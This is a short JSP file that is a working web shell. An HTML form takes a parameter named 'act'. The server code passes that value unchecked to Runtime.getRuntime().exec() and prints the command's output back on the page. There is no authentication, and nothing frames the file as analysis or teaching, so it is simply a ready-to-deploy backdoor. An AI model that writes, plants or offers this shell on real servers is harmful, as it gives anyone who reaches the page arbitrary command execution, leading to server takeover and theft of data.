<form method='GET' action='simple.jsp'>
<input name='act' type='text'>
<input type='submit' value='Run'>
</form>
<%@ page import="java.io.*" %>
<%
    String act = request.getParameter("act");
    String output = "";
    if(act != null) {
        String s = null;
        try {
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(Runtime.getRuntime().exec(act, null, null).getInputStream())
            );
            while((s = reader.readLine()) != null) { output += s+"</br>"; }
        }  
        catch(IOException e) 
        {   
            e.printStackTrace();   
        }
    }
%>
<pre><%=output %></pre>